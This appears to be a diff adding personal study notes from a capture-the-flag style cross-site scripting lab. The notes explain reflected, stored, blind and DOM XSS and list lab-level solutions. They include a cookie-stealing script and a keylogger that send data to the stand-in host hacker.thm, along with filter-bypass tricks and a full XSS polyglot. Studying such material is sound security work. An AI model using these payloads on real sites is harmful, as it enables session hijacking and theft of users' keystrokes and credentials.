@@ -1,0 +1,71 @@
+Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
+
+Proof Of Concept:
+This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:
+<script>alert('XSS');</script>
+Session Stealing:
+Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+Key Logger:
+The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
+  1- Attacker sends a link to victim that contains malicious payload 
+  2- Victim clicks link & is taken to vulnerbale website
+  3- Link containing attackers' script is executed on victims web browser
+  4- data sttackers script gathered is sent to attacker (cookies for session thefts)
+Stored XSS
+  1- Attacker inserts malicious payload into websites Database (leaving comment on forum)
+  2- every visit to website the malicious script is activated/ executed
+  3- data Attackers script gathers is sent to attaker
+Blind XSS    (Blind XSS is similar to a stored XSS)
+  1- in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
+  2- Example Scenario: A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.
+DOM  -Document Object Model --DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.--
+  The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
+  Potential Impact:
+  Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.
+  
+How to test for Blind XSS:
+When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
+A popular tool for Blind XSS attacks is xsshunter. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
+
+LEVEL 
+1- <script>alert('THM');</script>      -->  <h> chris </h>        -->     <h><script>alert('THM');</script></h>
+2- "><script>alert('THM');</script>    ---> <h> hello <input value="chris"> </h>    -->  <h> hello <input value=""><script>alert('THM');</script> </h>
+3- </textarea><script>alert('THM');</script> --> <h> hello <textarea>chris</textarea></h>    --> <h> hello <textarea></textarea><script>alert('THM');</script>
+4- <script> document.getElementByClassName('name')[0].innerHTML='Chris'; </script>  ---> ';alert('THM');//
+  he ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code
+  --> <script> document.getElementByClassName('name')[0].innerHTML=''';alert('THM');// ; </script>
+5- The word script  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.
+        When a word gets removed from a string, there's a helpful trick that you can try.
+        Original Payload:
+            <sscriptcript>alert('THM');</sscriptcript>
+        Text to be removed (by the filter): 
+            <sscriptcript>alert('THM');</sscriptcript>
+        Final Payload (after passing the filter):
+            <script>alert('THM');</script>
+6- Level Six:
+Similar to level two, where we had to escape from the value attribute of an input tag, we can try "><script>alert('THM');</script>, but that doesn't seem to work. Let's inspect the page source to see why that doesn't work.
+You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.
+Let's change our payload to reflect this /images/cat.jpg" onload="alert('THM'); and then viewing the page source, and you'll see how this will work.
+Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful; with this being the last level, you'll receive a flag that can be entered below.
+
+Polyglots:
+An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e            
+                                                                                            
+
+
+
+
+
+
+
+
+
+
+
+
